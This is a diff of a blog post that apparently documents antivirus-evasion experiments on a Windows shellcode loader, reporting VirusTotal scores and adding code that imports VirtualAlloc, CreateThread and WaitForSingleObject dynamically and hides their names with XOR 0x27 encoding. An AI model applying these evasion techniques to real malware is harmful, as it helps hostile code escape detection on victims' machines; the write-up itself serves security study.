@@ -216,7 +216,7 @@ SHA256: [7d7710c28190bc5d49187fd99bf042574705b57454ad770e7239b602596ddfbf](https
 
 <br>
 #### 3.3. XOR Summary
-Both the Fixed-XOR and Index-XOR scored the same 6/71 score on VirusTotal. This meant that even Fixed-XOR hid the shellcode successfully, and it doesn't matter the depth of the shellcode obfuscation. This suggests that the remaining 6 vendors detected other traits of the malicious file - likely the plaintext WinAPIs - and other patterns yet unknown (to me).
+Both the Fixed-XOR and Index-XOR scored the same 6/71 score on VirusTotal. This meant that even Fixed-XOR hid the shellcode successfully, and it didn't matter the depth of the shellcode obfuscation. This suggests that the remaining 6 vendors detected other traits of the malicious file - likely the plaintext WinAPIs - and other patterns yet unknown (to me).
 
 For the remaining incrementals, I will continue off the Index-XOR version.
 
@@ -228,6 +228,12 @@ I will generate 2 binaries, one with plaintext WinAPI strings, the other, obfusc
 
 <br>
 #### 4.1. Plaintext WinAPIs
+In the below code, I dynamically imported three WinAPIs,
++ VirtualAlloc
++ CreateThread
++ WaitForSingleObject
+
+By doing so, these APIs will not appear in the IAT of the binary.
 
 {% highlight cpp %}
 #include <windows.h>
@@ -266,3 +272,56 @@ int main() {
     return 0;
 }
 {% endhighlight %}
+
+SHA256: [f1a5e2dbb64219c6d0373234b489f457ef37571e7bc05a28b0c4bac16ad7e1a6](https://www.virustotal.com/gui/file/f1a5e2dbb64219c6d0373234b489f457ef37571e7bc05a28b0c4bac16ad7e1a6)
+
+
+<br>
+#### 4.2. Obfuscated WinAPIs
+A python script to first obfuscate the strings. Each character of the string is XORed with 0x27.
+
+{% highlight python %}
+def obfuscate_string(string: str):
+    bytestring = ""
+    for character in string:
+        char_int = ord(character)
+        char_int = char_int ^ 0x27
+        bytestring += "\\x" + hex(char_int)[2:]
+
+    return bytestring
+
+print("kernel32.dll:", obfuscate_string("kernel32.dll"))
+print("VirtualAlloc:", obfuscate_string("VirtualAlloc"))
+print("CreateThread:", obfuscate_string("CreateThread"))
+print("WaitForSingleObject:", obfuscate_string("WaitForSingleObject"))
+
+
+# -OUTPUT-
+# kernel32.dll: \x4c\x42\x55\x49\x42\x4b\x14\x15\x09\x43\x4b\x4b
+# VirtualAlloc: \x71\x4e\x55\x53\x52\x46\x4b\x66\x4b\x4b\x48\x44
+# CreateThread: \x64\x55\x42\x46\x53\x42\x73\x4f\x55\x42\x46\x43
+# WaitForSingleObject: \x70\x46\x4e\x53\x61\x48\x55\x74\x4e\x49\x40\x4b\x42\x68\x45\x4d\x42\x44\x53
+{% endhighlight %}
+
+<br>
+Here, the WinAPI strings are obfuscated and go through a decoding procedure before dynamically loading.
+
+{% highlight cpp %}
+void deobfuscate_string(char* string, int size) {
+    for (int i {0}; i < size - 1; i++) {
+        string[i] = string[i] ^ 0x27;
+    }
+}
+
+char kernel32_str[] {"\x4c\x42\x55\x49\x42\x4b\x14\x15\x09\x43\x4b\x4b"};
+char virtual_alloc_str[] {"\x71\x4e\x55\x53\x52\x46\x4b\x66\x4b\x4b\x48\x44"};
+char create_thread_str[] {"\x64\x55\x42\x46\x53\x42\x73\x4f\x55\x42\x46\x43"};
+char wait_for_single_obj_str[] {"\x70\x46\x4e\x53\x61\x48\x55\x74\x4e\x49\x40\x4b\x42\x68\x45\x4d\x42\x44\x53"};
+
+deobfuscate_string(kernel32_str, sizeof(kernel32_str));
+deobfuscate_string(virtual_alloc_str, sizeof(virtual_alloc_str));
+deobfuscate_string(create_thread_str, sizeof(create_thread_str));
+deobfuscate_string(wait_for_single_obj_str, sizeof(wait_for_single_obj_str));
+{% endhighlight %}
+
+SHA256: [ef75273f8200c6395fb19c1476da1211804e9cc3873d74d98408f7f76dee4c0d](https://www.virustotal.com/gui/file/ef75273f8200c6395fb19c1476da1211804e9cc3873d74d98408f7f76dee4c0d)
